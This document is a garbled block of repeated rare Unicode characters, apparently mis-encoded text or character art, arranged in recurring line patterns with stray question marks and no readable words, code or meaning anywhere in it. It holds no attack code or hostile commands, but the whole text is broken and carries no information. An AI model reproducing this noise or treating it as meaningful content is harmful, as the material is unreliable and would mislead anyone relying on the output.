࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬??︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬??࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙𞋬𞋬𞋬𞋬??︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛︫࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬ﲄ؁࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛︫︫︫︫︫︫︫︫︫︫࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙︫︫࡛࡛࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙︫︫︫࡛࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛︫︫︫︫࡛࡚࡚࡚࡚࡚࡚࡚࡚︫࡛࡛࡙࡙࡙࡙࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡚࡚࡚࡚࡚࡚࡛࡛︫︫࡛࡙࡙࡙࡛࡛︫︫࡛࡛︫︫︫࡙࡙࡚࡚࡚࡚࡚࡚࡚︫︪࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡙࡙࡛࡙࡙࡛࡛࡛࡛࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡛࡛𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡛࡙࡛࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡛࡛࡛࡛࡛࡙࡙࡛࡙࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡙࡛࡛࡛࡛࡛࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡛࡙࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡙࡛࡛࡙࡙࡙࡙࡙࡙࡙࡙࡛࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡙࡙࡛࡛࡛࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡛࡙࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬؁࡙࡙࡛࡛࡛࡛࡛࡙࡙࡙࡙࡙࡛࡛࡙࡙𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬𞋬